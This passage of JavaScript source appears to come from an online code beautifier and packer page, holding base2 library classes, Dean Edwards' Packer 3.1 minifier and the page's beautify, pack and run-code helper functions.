      delete this[_1 + a]
    },
    size: function() {
      var a = 0;
      for (var b in this) if (b.indexOf(_1) == 0) a++;
      return a
    },
    union: function(a) {
      return this.merge.apply(this.copy(), arguments)
    }
  });
  Map.implement(Enumerable);
  Map.prototype.filter = function(e, d) {
    return this.reduce(function(a, b, c) {
      if (!e.call(d, b, c, this)) {
        a.remove(c)
      }
      return a
    },
    this.copy(), this)
  };
  var _0 = "~";
  var Collection = Map.extend({
    constructor: function(a) {
      this[_0] = new Array2;
      this.base(a)
    },
    add: function(a, b) {
      assert(!this.has(a), "Duplicate key '" + a + "'.");
      this.put.apply(this, arguments)
    },
    clear: function() {
      this.base();
      this[_0].length = 0
    },
    copy: function() {
      var a = this.base();
      a[_0] = this[_0].copy();
      return a
    },
    forEach: function(a, b) {
      var c = this[_0];
      var e = c.length;
      for (var d = 0; d < e; d++) {
        a.call(b, this[_1 + c[d]], c[d], this)
      }
    },
    getAt: function(a) {
      var b = this[_0].item(a);
      return (b === undefined) ? undefined: this[_1 + b]
    },
    getKeys: function() {
      return this[_0].copy()
    },
    indexOf: function(a) {
      return this[_0].indexOf(String(a))
    },
    insertAt: function(a, b, c) {
      assert(this[_0].item(a) !== undefined, "Index out of bounds.");
      assert(!this.has(b), "Duplicate key '" + b + "'.");
      this[_0].insertAt(a, String(b));
      this[_1 + b] = null;
      this.put.apply(this, _2.call(arguments, 1))
    },
    item: function(a) {
      return this[typeof a == "number" ? "getAt": "get"](a)
    },
    put: function(a, b) {
      if (!this.has(a)) {
        this[_0].push(String(a))
      }
      var c = this.constructor;
      if (c.Item && !instanceOf(b, c.Item)) {
        b = c.create.apply(c, arguments)
      }
      this[_1 + a] = b
    },
    putAt: function(a, b) {
      arguments[0] = this[_0].item(a);
      assert(arguments[0] !== undefined, "Index out of bounds.");
      this.put.apply(this, arguments)
    },
    remove: function(a) {
      if (this.has(a)) {
        this[_0].remove(String(a));
        delete this[_1 + a]
      }
    },
    removeAt: function(a) {
      var b = this[_0].item(a);
      if (b !== undefined) {
        this[_0].removeAt(a);
        delete this[_1 + b]
      }
    },
    reverse: function() {
      this[_0].reverse();
      return this
    },
    size: function() {
      return this[_0].length
    },
    slice: function(a, b) {
      var c = this.copy();
      if (arguments.length > 0) {
        var e = this[_0],
        d = e;
        c[_0] = Array2(_2.apply(e, arguments));
        if (c[_0].length) {
          d = d.slice(0, a);
          if (arguments.length > 1) {
            d = d.concat(e.slice(b))
          }
        }
        for (var f = 0; f < d.length; f++) {
          delete c[_1 + d[f]]
        }
      }
      return c
    },
    sort: function(c) {
      if (c) {
        this[_0].sort(bind(function(a, b) {
          return c(this[_1 + a], this[_1 + b], a, b)
        },
        this))
      } else this[_0].sort();
      return this
    },
    toString: function() {
      return "(" + (this[_0] || "") + ")"
    }
  },
  {
    Item: null,
    create: function(a, b) {
      return this.Item ? new this.Item(a, b) : b
    },
    extend: function(a, b) {
      var c = this.base(a);
      c.create = this.create;
      if (b) extend(c, b);
      if (!c.Item) {
        c.Item = this.Item
      } else if (typeof c.Item != "function") {
        c.Item = (this.Item || Base).extend(c.Item)
      }
      if (c.init) c.init();
      return c
    }
  });
  var _p = /\\(\d+)/g,
  _q = /\\./g,
  _r = /\(\?[:=!]|\[[^\]]+\]/g,
  _s = /\(/g,
  _t = /\$(\d+)/,
  _u = /^\$\d+$/;
  var RegGrp = Collection.extend({
    constructor: function(a, b) {
      this.base(a);
      this.ignoreCase = !!b
    },
    ignoreCase: false,
    exec: function(g, i) {
      g += "";
      var h = this,
      j = this[_0];
      if (!j.length) return g;
      if (i == RegGrp.IGNORE) i = 0;
      return g.replace(new RegExp(this, this.ignoreCase ? "gi": "g"),
      function(a) {
        var b, c = 1,
        e = 0;
        while ((b = h[_1 + j[e++]])) {
          var d = c + b.length + 1;
          if (arguments[c]) {
            var f = i == null ? b.replacement: i;
            switch (typeof f) {
            case "function":
              return f.apply(h, _2.call(arguments, c, d));
            case "number":
              return arguments[c + f];
            default:
              return f
            }
          }
          c = d
        }
        return a
      })
    },
    insertAt: function(a, b, c) {
      if (instanceOf(b, RegExp)) {
        arguments[1] = b.source
      }
      return base(this, arguments)
    },
    test: function(a) {
      return this.exec(a) != a
    },
    toString: function() {
      var d = 1;
      return "(" + this.map(function(c) {
        var e = (c + "").replace(_p,
        function(a, b) {
          return "\\" + (d + Number(b))
        });
        d += c.length + 1;
        return e
      }).join(")|(") + ")"
    }
  },
  {
    IGNORE: "$0",
    init: function() {
      forEach("add,get,has,put,remove".split(","),
      function(b) {
        _8(this, b,
        function(a) {
          if (instanceOf(a, RegExp)) {
            arguments[0] = a.source
          }
          return base(this, arguments)
        })
      },
      this.prototype)
    },
    Item: {
      constructor: function(a, b) {
        if (b == null) b = RegGrp.IGNORE;
        else if (b.replacement != null) b = b.replacement;
        else if (typeof b != "function") b = String(b);
        if (typeof b == "string" && _t.test(b)) {
          if (_u.test(b)) {
            b = parseInt(b.slice(1))
          } else {
            var c = '"';
            b = b.replace(/\\/g, "\\\\").replace(/"/g, "\\x22").replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/\$(\d+)/g, c + "+(arguments[$1]||" + c + c + ")+" + c).replace(/(['"])\1\+(.*)\+\1\1$/, "$1");
            b = new Function("return " + c + b + c)
          }
        }
        this.length = RegGrp.count(a);
        this.replacement = b;
        this.toString = K(a + "")
      },
      length: 0,
      replacement: ""
    },
    count: function(a) {
      a = (a + "").replace(_q, "").replace(_r, "");
      return match(a, _s).length
    }
  });
  var lang = {
    name: "lang",
    version: base2.version,
    exports: "assert,assertArity,assertType,base,bind,copy,extend,forEach,format,instanceOf,match,pcopy,rescape,trim,typeOf",
    namespace: ""
  };
  function assert(a, b, c) {
    if (!a) {
      throw new(c || Error)(b || "Assertion failed.");
    }
  };
  function assertArity(a, b, c) {
    if (b == null) b = a.callee.length;
    if (a.length < b) {
      throw new SyntaxError(c || "Not enough arguments.");
    }
  };
  function assertType(a, b, c) {
    if (b && (typeof b == "function" ? !instanceOf(a, b) : typeOf(a) != b)) {
      throw new TypeError(c || "Invalid type.");
    }
  };
  function copy(a) {
    var b = {};
    for (var c in a) {
      b[c] = a[c]
    }
    return b
  };
  function pcopy(a) {
    _d.prototype = a;
    return new _d
  };
  function _d() {};
  function base(a, b) {
    return a.base.apply(a, b)
  };
  function extend(a, b) {
    if (a && b) {
      if (arguments.length > 2) {
        var c = b;
        b = {};
        b[c] = arguments[2]
      }
      var e = global[(typeof b == "function" ? "Function": "Object")].prototype;
      if (base2.__prototyping) {
        var d = _a.length,
        c;
        while ((c = _a[--d])) {
          var f = b[c];
          if (f != e[c]) {
            if (_9.test(f)) {
              _8(a, c, f)
            } else {
              a[c] = f
            }
          }
        }
      }
      for (c in b) {
        if (e[c] === undefined) {
          var f = b[c];
          if (c.charAt(0) == "@") {
            if (detect(c.slice(1))) extend(a, f)
          } else {
            var g = a[c];
            if (g && typeof f == "function") {
              if (f != g) {
                if (_9.test(f)) {
                  _8(a, c, f)
                } else {
                  f.ancestor = g;
                  a[c] = f
                }
              }
            } else {
              a[c] = f
            }
          }
        }
      }
    }
    return a
  };
  function _7(a, b) {
    while (b) {
      if (!b.ancestor) return false;
      b = b.ancestor;
      if (b == a) return true
    }
    return false
  };
  function _8(c, e, d) {
    var f = c[e];
    var g = base2.__prototyping;
    if (g && f != g[e]) g = null;
    function i() {
      var a = this.base;
      this.base = g ? g[e] : f;
      var b = d.apply(this, arguments);
      this.base = a;
      return b
    };
    i.method = d;
    i.ancestor = f;
    c[e] = i
  };
  if (typeof StopIteration == "undefined") {
    StopIteration = new Error("StopIteration")
  }
  function forEach(a, b, c, e) {
    if (a == null) return;
    if (!e) {
      if (typeof a == "function" && a.call) {
        e = Function
      } else if (typeof a.forEach == "function" && a.forEach != arguments.callee) {
        a.forEach(b, c);
        return
      } else if (typeof a.length == "number") {
        _e(a, b, c);
        return
      }
    }
    _5(e || Object, a, b, c)
  };
  forEach.csv = function(a, b, c) {
    forEach(csv(a), b, c)
  };
  forEach.detect = function(c, e, d) {
    forEach(c,
    function(a, b) {
      if (b.charAt(0) == "@") {
        if (detect(b.slice(1))) forEach(a, arguments.callee)
      } else e.call(d, a, b, c)
    })
  };
  function _e(a, b, c) {
    if (a == null) a = global;
    var e = a.length || 0,
    d;
    if (typeof a == "string") {
      for (d = 0; d < e; d++) {
        b.call(c, a.charAt(d), d, a)
      }
    } else {
      for (d = 0; d < e; d++) {
        /*@cc_on @*/
        /*@if(@_jscript_version<5.2)if($Legacy.has(a,d))@else @*/
        if (d in a)
        /*@end @*/
        b.call(c, a[d], d, a)
      }
    }
  };
  function _5(g, i, h, j) {
    var k = function() {
      this.i = 1
    };
    k.prototype = {
      i: 1
    };
    var l = 0;
    for (var m in new k) l++;
    _5 = (l > 1) ?
    function(a, b, c, e) {
      var d = {};
      for (var f in b) {
        if (!d[f] && a.prototype[f] === undefined) {
          d[f] = true;
          c.call(e, b[f], f, b)
        }
      }
    }: function(a, b, c, e) {
      for (var d in b) {
        if (a.prototype[d] === undefined) {
          c.call(e, b[d], d, b)
        }
      }
    };
    _5(g, i, h, j)
  };
  function instanceOf(a, b) {
    if (typeof b != "function") {
      throw new TypeError("Invalid 'instanceOf' operand.");
    }
    if (a == null) return false;
    /*@cc_on if(typeof a.constructor!="function"){return typeOf(a)==typeof b.prototype.valueOf()}@*/
    if (a.constructor == b) return true;
    if (b.ancestorOf) return b.ancestorOf(a.constructor);
    /*@if(@_jscript_version<5.1)@else @*/
    if (a instanceof b) return true;
    /*@end @*/
    if (Base.ancestorOf == b.ancestorOf) return false;
    if (Base.ancestorOf == a.constructor.ancestorOf) return b == Object;
    switch (b) {
    case Array:
      return !! (typeof a == "object" && a.join && a.splice);
    case Function:
      return typeOf(a) == "function";
    case RegExp:
      return typeof a.constructor.$1 == "string";
    case Date:
      return !! a.getTimezoneOffset;
    case String:
    case Number:
    case Boolean:
      return typeOf(a) == typeof b.prototype.valueOf();
    case Object:
      return true
    }
    return false
  };
  function typeOf(a) {
    var b = typeof a;
    switch (b) {
    case "object":
      return a == null ? "null": typeof a.constructor == "undefined" ? _j.test(a) ? "function": b: typeof a.constructor.prototype.valueOf();
    case "function":
      return typeof a.call == "function" ? b: "object";
    default:
      return b
    }
  };
  var JavaScript = {
    name: "JavaScript",
    version: base2.version,
    exports: "Array2,Date2,Function2,String2",
    namespace: "",
    bind: function(c) {
      var e = global;
      global = c;
      forEach.csv(this.exports,
      function(a) {
        var b = a.slice(0, -1);
        extend(c[b], this[a]);
        this[a](c[b].prototype)
      },
      this);
      global = e;
      return c
    }
  };
  function _6(b, c, e, d) {
    var f = Module.extend();
    var g = f.toString().slice(1, -1);
    forEach.csv(e,
    function(a) {
      f[a] = unbind(b.prototype[a]);
      f.namespace += format("var %1=%2.%1;", a, g)
    });
    forEach(_2.call(arguments, 3), f.implement, f);
    var i = function() {
      return f(this.constructor == f ? c.apply(null, arguments) : arguments[0])
    };
    i.prototype = f.prototype;
    for (var h in f) {
      if (h != "prototype" && b[h]) {
        f[h] = b[h];
        delete f.prototype[h]
      }
      i[h] = f[h]
    }
    i.ancestor = Object;
    delete i.extend;
    i.namespace = i.namespace.replace(/(var (\w+)=)[^,;]+,([^\)]+)\)/g, "$1$3.$2");
    return i
  };
  if ((new Date).getYear() > 1900) {
    Date.prototype.getYear = function() {
      return this.getFullYear() - 1900
    };
    Date.prototype.setYear = function(a) {
      return this.setFullYear(a + 1900)
    }
  }
  var _f = new Date(Date.UTC(2006, 1, 20));
  _f.setUTCDate(15);
  if (_f.getUTCHours() != 0) {
    forEach.csv("FullYear,Month,Date,Hours,Minutes,Seconds,Milliseconds",
    function(b) {
      extend(Date.prototype, "setUTC" + b,
      function() {
        var a = base(this, arguments);
        if (a >= 57722401000) {
          a -= 3600000;
          this.setTime(a)
        }
        return a
      })
    })
  }
  Function.prototype.prototype = {};
  if ("".replace(/^/, K("$$")) == "$") {
    extend(String.prototype, "replace",
    function(a, b) {
      if (typeof b == "function") {
        var c = b;
        b = function() {
          return String(c.apply(null, arguments)).split("$").join("$$")
        }
      }
      return this.base(a, b)
    })
  }
  var Array2 = _6(Array, Array, "concat,join,pop,push,reverse,shift,slice,sort,splice,unshift", Enumerable, {
    combine: function(e, d) {
      if (!d) d = e;
      return Array2.reduce(e,
      function(a, b, c) {
        a[b] = d[c];
        return a
      },
      {})
    },
    contains: function(a, b) {
      return Array2.indexOf(a, b) != -1
    },
    copy: function(a) {
      var b = _2.call(a);
      if (!b.swap) Array2(b);
      return b
    },
    flatten: function(c) {
      var e = 0;
      return Array2.reduce(c,
      function(a, b) {
        if (Array2.like(b)) {
          Array2.reduce(b, arguments.callee, a)
        } else {
          a[e++] = b
        }
        return a
      },
      [])
    },
    forEach: _e,
    indexOf: function(a, b, c) {
      var e = a.length;
      if (c == null) {
        c = 0
      } else if (c < 0) {
        c = Math.max(0, e + c)
      }
      for (var d = c; d < e; d++) {
        if (a[d] === b) return d
      }
      return - 1
    },
    insertAt: function(a, b, c) {
      Array2.splice(a, b, 0, c);
      return c
    },
    item: function(a, b) {
      if (b < 0) b += a.length;
      return a[b]
    },
    lastIndexOf: function(a, b, c) {
      var e = a.length;
      if (c == null) {
        c = e - 1
      } else if (c < 0) {
        c = Math.max(0, e + c)
      }
      for (var d = c; d >= 0; d--) {
        if (a[d] === b) return d
      }
      return - 1
    },
    map: function(c, e, d) {
      var f = [];
      Array2.forEach(c,
      function(a, b) {
        f[b] = e.call(d, a, b, c)
      });
      return f
    },
    remove: function(a, b) {
      var c = Array2.indexOf(a, b);
      if (c != -1) Array2.removeAt(a, c)
    },
    removeAt: function(a, b) {
      Array2.splice(a, b, 1)
    },
    swap: function(a, b, c) {
      if (b < 0) b += a.length;
      if (c < 0) c += a.length;
      var e = a[b];
      a[b] = a[c];
      a[c] = e;
      return a
    }
  });
  Array2.reduce = Enumerable.reduce;
  Array2.like = function(a) {
    return typeOf(a) == "object" && typeof a.length == "number"
  };
  var _v = /^((-\d+|\d{4,})(-(\d{2})(-(\d{2}))?)?)?T((\d{2})(:(\d{2})(:(\d{2})(\.(\d{1,3})(\d)?\d*)?)?)?)?(([+-])(\d{2})(:(\d{2}))?|Z)?$/;
  var _4 = {
    FullYear: 2,
    Month: 4,
    Date: 6,
    Hours: 8,
    Minutes: 10,
    Seconds: 12,
    Milliseconds: 14
  };
  var _3 = {
    Hectomicroseconds: 15,
    UTC: 16,
    Sign: 17,
    Hours: 18,
    Minutes: 20
  };
  var _w = /(((00)?:0+)?:0+)?\.0+$/;
  var _x = /(T[0-9:.]+)$/;
  var Date2 = _6(Date,
  function(a, b, c, e, d, f, g) {
    switch (arguments.length) {
    case 0:
      return new Date;
    case 1:
      return typeof a == "number" ? new Date(a) : Date2.parse(a);
    default:
      return new Date(a, b, arguments.length == 2 ? 1 : c, e || 0, d || 0, f || 0, g || 0)
    }
  },
  "", {
    toISOString: function(c) {
      var e = "####-##-##T##:##:##.###";
      for (var d in _4) {
        e = e.replace(/#+/,
        function(a) {
          var b = c["getUTC" + d]();
          if (d == "Month") b++;
          return ("000" + b).slice( - a.length)
        })
      }
      return e.replace(_w, "").replace(_x, "$1Z")
    }
  });
  delete Date2.forEach;
  Date2.now = function() {
    return (new Date).valueOf()
  };
  Date2.parse = function(a, b) {
    if (arguments.length > 1) {
      assertType(b, "number", "default date should be of type 'number'.")
    }
    var c = match(a, _v);
    if (c.length) {
      if (c[_4.Month]) c[_4.Month]--;
      if (c[_3.Hectomicroseconds] >= 5) c[_4.Milliseconds]++;
      var e = new Date(b || 0);
      var d = c[_3.UTC] || c[_3.Hours] ? "UTC": "";
      for (var f in _4) {
        var g = c[_4[f]];
        if (!g) continue;
        e["set" + d + f](g);
        if (e["get" + d + f]() != c[_4[f]]) {
          return NaN
        }
      }
      if (c[_3.Hours]) {
        var i = Number(c[_3.Sign] + c[_3.Hours]);
        var h = Number(c[_3.Sign] + (c[_3.Minutes] || 0));
        e.setUTCMinutes(e.getUTCMinutes() + (i * 60) + h)
      }
      return e.valueOf()
    } else {
      return Date.parse(a)
    }
  };
  var String2 = _6(String,
  function(a) {
    return new String(arguments.length == 0 ? "": a)
  },
  "charAt,charCodeAt,concat,indexOf,lastIndexOf,match,replace,search,slice,split,substr,substring,toLowerCase,toUpperCase", {
    csv: csv,
    format: format,
    rescape: rescape,
    trim: trim
  });
  delete String2.forEach;
  function trim(a) {
    return String(a).replace(_g, "").replace(_h, "")
  };
  function csv(a) {
    return a ? (a + "").split(/\s*,\s*/) : []
  };
  function format(c) {
    var e = arguments;
    var d = new RegExp("%([1-" + (arguments.length - 1) + "])", "g");
    return (c + "").replace(d,
    function(a, b) {
      return e[b]
    })
  };
  function match(a, b) {
    return (a + "").match(b) || []
  };
  function rescape(a) {
    return (a + "").replace(_i, "\\$1")
  };
  var Function2 = _6(Function, Function, "", {
    I: I,
    II: II,
    K: K,
    bind: bind,
    compose: compose,
    delegate: delegate,
    flip: flip,
    not: not,
    partial: partial,
    unbind: unbind
  });
  function I(a) {
    return a
  };
  function II(a, b) {
    return b
  };
  function K(a) {
    return function() {
      return a
    }
  };
  function bind(a, b) {
    var c = typeof a != "function";
    if (arguments.length > 2) {
      var e = _2.call(arguments, 2);
      return function() {
        return (c ? b[a] : a).apply(b, e.concat.apply(e, arguments))
      }
    } else {
      return function() {
        return (c ? b[a] : a).apply(b, arguments)
      }
    }
  };
  function compose() {
    var c = _2.call(arguments);
    return function() {
      var a = c.length,
      b = c[--a].apply(this, arguments);
      while (a--) b = c[a].call(this, b);
      return b
    }
  };
  function delegate(b, c) {
    return function() {
      var a = _2.call(arguments);
      a.unshift(this);
      return b.apply(c, a)
    }
  };
  function flip(a) {
    return function() {
      return a.apply(this, Array2.swap(arguments, 0, 1))
    }
  };
  function not(a) {
    return function() {
      return ! a.apply(this, arguments)
    }
  };
  function partial(e) {
    var d = _2.call(arguments, 1);
    return function() {
      var a = d.concat(),
      b = 0,
      c = 0;
      while (b < d.length && c < arguments.length) {
        if (a[b] === undefined) a[b] = arguments[c++];
        b++
      }
      while (c < arguments.length) {
        a[b++] = arguments[c++]
      }
      if (Array2.contains(a, undefined)) {
        a.unshift(e);
        return partial.apply(null, a)
      }
      return e.apply(this, a)
    }
  };
  function unbind(b) {
    return function(a) {
      return b.apply(a, _2.call(arguments, 1))
    }
  };
  function detect() {
    var d = NaN
    /*@cc_on||@_jscript_version@*/
    ;
    var f = global.java ? true: false;
    if (global.navigator) {
      var g = /MSIE[\d.]+/g;
      var i = document.createElement("span");
      var h = navigator.userAgent.replace(/([a-z])[\s\/](\d)/gi, "$1$2");
      if (!d) h = h.replace(g, "");
      if (g.test(h)) h = h.match(g)[0] + " " + h.replace(g, "");
      base2.userAgent = navigator.platform + " " + h.replace(/like \w+/gi, "");
      f &= navigator.javaEnabled()
    }
    var j = {};
    detect = function(a) {
      if (j[a] == null) {
        var b = false,
        c = a;
        var e = c.charAt(0) == "!";
        if (e) c = c.slice(1);
        if (c.charAt(0) == "(") {
          try {
            b = new Function("element,jscript,java,global", "return !!" + c)(i, d, f, global)
          } catch(ex) {}
        } else {
          b = new RegExp("(" + c + ")", "i").test(base2.userAgent)
        }
        j[a] = !!(e ^ b)
      }
      return j[a]
    };
    return detect(arguments[0])
  };
  base2 = global.base2 = new Package(this, base2);
  var exports = this.exports;
  lang = new Package(this, lang);
  exports += this.exports;
  JavaScript = new Package(this, JavaScript);
  eval(exports + this.exports);
  lang.base = base;
  lang.extend = extend
};
new function(){new base2.Package(this,{imports:"Function2,Enumerable"});eval(this.imports);var i=RegGrp.IGNORE;var S="~";var A="";var F=" ";var p=RegGrp.extend({put:function(a,c){if(typeOf(a)=="string"){a=p.dictionary.exec(a)}this.base(a,c)}},{dictionary:new RegGrp({OPERATOR:/return|typeof|[\[(\^=,{}:;&|!*?]/.source,CONDITIONAL:/\/\*@\w*|\w*@\*\/|\/\/@\w*|@\w+/.source,COMMENT1:/\/\/[^\n]*/.source,COMMENT2:/\/\*[^*]*\*+([^\/][^*]*\*+)*\//.source,REGEXP:/\/(\\[\/\\]|[^*\/])(\\.|[^\/\n\\])*\/[gim]*/.source,STRING1:/'(\\.|[^'\\])*'/.source,STRING2:/"(\\.|[^"\\])*"/.source})});var B=Collection.extend({add:function(a){if(!this.has(a))this.base(a);a=this.get(a);if(!a.index){a.index=this.size()}a.count++;return a},sort:function(d){return this.base(d||function(a,c){return(c.count-a.count)||(a.index-c.index)})}},{Item:{constructor:function(a){this.toString=K(a)},index:0,count:0,encoded:""}});var v=Base.extend({constructor:function(a,c,d){this.parser=new p(d);if(a)this.parser.put(a,"");this.encoder=c},parser:null,encoder:Undefined,search:function(c){var d=new B;this.parser.putAt(-1,function(a){d.add(a)});this.parser.exec(c);return d},encode:function(c){var d=this.search(c);d.sort();var b=0;forEach(d,function(a){a.encoded=this.encoder(b++)},this);this.parser.putAt(-1,function(a){return d.get(a).encoded});return this.parser.exec(c)}});var w=v.extend({constructor:function(){return this.base(w.PATTERN,function(a){return"_"+Packer.encode62(a)},w.IGNORE)}},{IGNORE:{CONDITIONAL:i,"(OPERATOR)(REGEXP)":i},PATTERN:/\b_[\da-zA-Z$][\w$]*\b/g});var q=v.extend({encode:function(d){var b=this.search(d);b.sort();var f=new Collection;var e=b.size();for(var h=0;h<e;h++){f.put(Packer.encode62(h),h)}function C(a){return b["#"+a].replacement};var k=K("");var l=0;forEach(b,function(a){if(f.has(a)){a.index=f.get(a);a.toString=k}else{while(b.has(Packer.encode62(l)))l++;a.index=l++;if(a.count==1){a.toString=k}}a.replacement=Packer.encode62(a.index);if(a.replacement.length==a.toString().length){a.toString=k}});b.sort(function(a,c){return a.index-c.index});b=b.slice(0,this.getKeyWords(b).split("|").length);d=d.replace(this.getPattern(b),C);var r=this.escape(d);var m="[]";var t=this.getCount(b);var g=this.getKeyWords(b);var n=this.getEncoder(b);var u=this.getDecoder(b);return format(q.UNPACK,r,m,t,g,n,u)},search:function(a){var c=new B;forEach(a.match(q.WORDS),c.add,c);return c},escape:function(a){return a.replace(/([\\'])/g,"\\$1").replace(/[\r\n]+/g,"\\n")},getCount:function(a){return a.size()||1},getDecoder:function(c){var d=new RegGrp({"(\\d)(\\|\\d)+\\|(\\d)":"$1-$3","([a-z])(\\|[a-z])+\\|([a-z])":"$1-$3","([A-Z])(\\|[A-Z])+\\|([A-Z])":"$1-$3","\\|":""});var b=d.exec(c.map(function(a){if(a.toString())return a.replacement;return""}).slice(0,62).join("|"));if(!b)return"^$";b="["+b+"]";var f=c.size();if(f>62){b="("+b+"|";var e=Packer.encode62(f).charAt(0);if(e>"9"){b+="[\\\\d";if(e>="a"){b+="a";if(e>="z"){b+="-z";if(e>="A"){b+="A";if(e>"A")b+="-"+e}}else if(e=="b"){b+="-"+e}}b+="]"}else if(e==9){b+="\\\\d"}else if(e==2){b+="[12]"}else if(e==1){b+="1"}else{b+="[1-"+e+"]"}b+="\\\\w)"}return b},getEncoder:function(a){var c=a.size();return q["ENCODE"+(c>10?c>36?62:36:10)]},getKeyWords:function(a){return a.map(String).join("|").replace(/\|+$/,"")},getPattern:function(a){var a=a.map(String).join("|").replace(/\|{2,}/g,"|").replace(/^\|+|\|+$/g,"")||"\\x0";return new RegExp("\\b("+a+")\\b","g")}},{WORDS:/\b[\da-zA-Z]\b|\w{2,}/g,ENCODE10:"String",ENCODE36:"function(c){return c.toString(36)}",ENCODE62:"function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))}",UNPACK:"eval(function(p,a,c,k,e,r){e=%5;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'%6'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('%1',%2,%3,'%4'.split('|'),0,{}))"});global.Packer=Base.extend({constructor:function(){this.minifier=new j;this.shrinker=new o;this.privates=new w;this.base62=new q},minifier:null,shrinker:null,privates:null,base62:null,pack:function(a,c,d,b){a=this.minifier.minify(a);if(d)a=this.shrinker.shrink(a);if(b)a=this.privates.encode(a);if(c)a=this.base62.encode(a);return a}},{version:"3.1",init:function(){eval("var e=this.encode62="+q.ENCODE62)},data:new p({"STRING1":i,'STRING2':i,"CONDITIONAL":i,"(OPERATOR)\\s*(REGEXP)":"$1$2"}),encode52:function(c){function d(a){return(a<52?'':d(parseInt(a/52)))+((a=a%52)>25?String.fromCharCode(a+39):String.fromCharCode(a+97))};var b=d(c);if(/^(do|if|in)$/.test(b))b=b.slice(1)+0;return b}});var j=Base.extend({minify:function(a){a+="\n";a=a.replace(j.CONTINUE,"");a=j.comments.exec(a);a=j.clean.exec(a);a=j.whitespace.exec(a);a=j.concat.exec(a);return a}},{CONTINUE:/\\\r?\n/g,init:function(){this.concat=new p(this.concat).merge(Packer.data);extend(this.concat,"exec",function(a){var c=this.base(a);while(c!=a){a=c;c=this.base(a)}return c});forEach.csv("comments,clean,whitespace",function(a){this[a]=Packer.data.union(new p(this[a]))},this);this.conditionalComments=this.comments.copy();this.conditionalComments.putAt(-1," $3");this.whitespace.removeAt(2);this.comments.removeAt(2)},clean:{"\\(\\s*([^;)]*)\\s*;\\s*([^;)]*)\\s*;\\s*([^;)]*)\\)":"($1;$2;$3)","throw[^};]+[};]":i,";+\\s*([};])":"$1"},comments:{";;;[^\\n]*\\n":A,"(COMMENT1)\\n\\s*(REGEXP)?":"\n$3","(COMMENT2)\\s*(REGEXP)?":function(a,c,d,b){if(/^\/\*@/.test(c)&&/@\*\/$/.test(c)){c=j.conditionalComments.exec(c)}else{c=""}return c+" "+(b||"")}},concat:{"(STRING1)\\+(STRING1)":function(a,c,d,b){return c.slice(0,-1)+b.slice(1)},"(STRING2)\\+(STRING2)":function(a,c,d,b){return c.slice(0,-1)+b.slice(1)}},whitespace:{"\\/\\/@[^\\n]*\\n":i,"@\\s+\\b":"@ ","\\b\\s+@":" @","(\\d)\\s+(\\.\\s*[a-z\\$_\\[(])":"$1 $2","([+-])\\s+([+-])":"$1 $2","\\b\\s+\\$\\s+\\b":" $ ","\\$\\s+\\b":"$ ","\\b\\s+\\$":" $","\\b\\s+\\b":F,"\\s+":A}});var o=Base.extend({decodeData:function(d){var b=this._data;delete this._data;return d.replace(o.ENCODED_DATA,function(a,c){return b[c]})},encodeData:function(f){var e=this._data=[];return Packer.data.exec(f,function(a,c,d){var b="\x01"+e.length+"\x01";if(d){b=c+b;a=d}e.push(a);return b})},shrink:function(g){g=this.encodeData(g);function n(a){return new RegExp(a.source,"g")};var u=/((catch|do|if|while|with|function)\b[^~{};]*(\(\s*[^{};]*\s*\))\s*)?(\{[^{}]*\})/;var G=n(u);var x=/\{[^{}]*\}|\[[^\[\]]*\]|\([^\(\)]*\)|~[^~]+~/;var H=n(x);var D=/~#?(\d+)~/;var I=/[a-zA-Z_$][\w\$]*/g;var J=/~#(\d+)~/;var L=/\bvar\b/g;var M=/\bvar\s+[\w$]+[^;#]*|\bfunction\s+[\w$]+/g;var N=/\b(var|function)\b|\sin\s+[^;]+/g;var O=/\s*=[^,;]*/g;var s=[];var E=0;function P(a,c,d,b,f){if(!c)c="";if(d=="function"){f=b+y(f,J);c=c.replace(x,"");b=b.slice(1,-1);if(b!="_no_shrink_"){var e=match(f,M).join(";").replace(L,";var");while(x.test(e)){e=e.replace(H,"")}e=e.replace(N,"").replace(O,"")}f=y(f,D);if(b!="_no_shrink_"){var h=0,C;var k=match([b,e],I);var l={};for(var r=0;r<k.length;r++){id=k[r];if(!l["#"+id]){l["#"+id]=true;id=rescape(id);while(new RegExp(o.PREFIX+h+"\\b").test(f))h++;var m=new RegExp("([^\\w$.])"+id+"([^\\w$:])");while(m.test(f)){f=f.replace(n(m),"$1"+o.PREFIX+h+"$2")}var m=new RegExp("([^{,\\w$.])"+id+":","g");f=f.replace(m,"$1"+o.PREFIX+h+":");h++}}E=Math.max(E,h)}var t=c+"~"+s.length+"~";s.push(f)}else{var t="~#"+s.length+"~";s.push(c+f)}return t};function y(d,b){while(b.test(d)){d=d.replace(n(b),function(a,c){return s[c]})}return d};while(u.test(g)){g=g.replace(G,P)}g=y(g,D);var z,Q=0;var R=new v(o.SHRUNK,function(){do z=Packer.encode52(Q++);while(new RegExp("[^\\w$.]"+z+"[^\\w$:]").test(g));return z});g=R.encode(g);return this.decodeData(g)}},{ENCODED_DATA:/\x01(\d+)\x01/g,PREFIX:"\x02",SHRUNK:/\x02\d+\b/g})};

    function do_js_beautify() {
        //document.getElementById('beautify').disabled = true;
        js_source = document.getElementById('c2').value.replace(/^\s+/, '');
        tabsize = document.getElementById('tabsize').value;
        tabchar = ' ';
        if (tabsize == 1) {
            tabchar = '\t';
        }
        if (js_source && js_source.charAt(0) === '<') {
            document.getElementById('c2').value = style_html(js_source, tabsize, tabchar, 80);
        } else {
            document.getElementById('c2').value = js_beautify(js_source, tabsize, tabchar);
        }
        //document.getElementById('beautify').disabled = false;
    textCounter();
    keyUp();
        return false;
    }
    function pack_js(base64) {
        var input = document.getElementById('c2').value;
        var packer = new Packer;
        if (base64) {
            var output = packer.pack(input, 1, 0);
        } else {
            var output = packer.pack(input, 0, 0);
        }
        document.getElementById('c2').value = output;
    textCounter();
    keyUp();
    }
    function GetFocus() {
        document.getElementById('c2').focus();
    }

///////////////////////////////



function mousePos(e){
var x,y;
var e = e||window.event;
return {
x:e.clientX+document.body.scrollLeft+document.documentElement.scrollLeft,
y:e.clientY+document.body.scrollTop+document.documentElement.scrollTop
};
};
function test(e){
$$("mjs").style.left = mousePos(e).x+"px";   
};




//����
 function runCode(obj) { 
  var winname = window.open('', "_blank", ''); 
